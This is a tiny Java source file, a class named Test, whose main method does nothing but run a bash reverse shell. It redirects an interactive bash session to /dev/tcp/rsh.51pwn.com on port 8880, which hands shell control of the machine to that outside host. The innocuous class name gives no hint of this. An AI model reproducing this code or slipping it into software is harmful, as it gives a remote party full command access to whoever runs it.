package other;

import static java.lang.Runtime.getRuntime;

public class Test {
    public static void main(String[] args) {
        try {
            getRuntime().exec("bash -c 'exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1'");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
